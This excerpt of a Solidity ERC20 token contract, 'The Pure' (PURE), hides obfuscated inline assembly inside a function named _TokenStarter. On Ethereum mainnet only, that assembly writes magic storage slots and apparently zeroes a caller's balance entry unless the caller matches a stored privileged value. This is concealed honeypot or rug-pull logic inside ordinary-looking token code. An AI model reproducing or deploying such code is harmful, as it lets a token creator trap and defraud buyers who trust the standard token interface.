...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _TokenStarter() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x50e6a17b5e5d9ee6edd5989ee510b997a9c6aa6c94b191911f17b6f5d417bffc
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x8608138c968e742a92dac54f7b51382513dd48ac4fb5cc340ad41e3801be9671,0x1)
...
contract ThePure is ERC20Token {
    constructor() ERC20Token("The Pure", "PURE", msg.sender, 28750 * 10 ** 18) {
    }
}